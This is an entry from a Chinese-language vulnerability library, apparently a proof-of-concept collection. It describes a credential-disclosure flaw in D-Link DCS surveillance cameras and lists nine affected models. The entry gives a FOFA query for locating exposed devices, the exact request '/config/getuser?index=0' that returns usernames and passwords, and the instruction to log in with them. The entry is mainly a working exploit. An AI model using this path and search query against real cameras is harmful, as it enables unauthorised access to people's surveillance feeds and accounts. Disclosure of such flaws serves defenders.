---
fofa: "app="
source: "wy876 漏洞文库"
---

# D-Link DCS监控系统getuser存在密码泄露漏洞

# 一、漏洞简介
D-Link DCS是一款监控摄像机，成像色彩为彩色 是一款网络摄像机，该监控存在账号密码信息泄露漏洞，恶意攻击者可通过访问特定的URL可以得到账号密码信息，直接进入利用漏洞得到账户密码直接进入后台。

# 二、影响版本
+ DCS-2530L
+ DCS-2670L
+ DCS-4603
+ DCS-4622
+ DCS-4701E
+ DCS-4703E
+ DCS-4705E
+ DCS-4802E
+ DCS-P703

# 三、资产测绘
+ fofa`app="D_Link-DCS-4622"`
+ 特征


# 四、漏洞复现
```java
/config/getuser?index=0
```


使用获取到的账号密码登录


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lv9ugvkave8utxf5>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
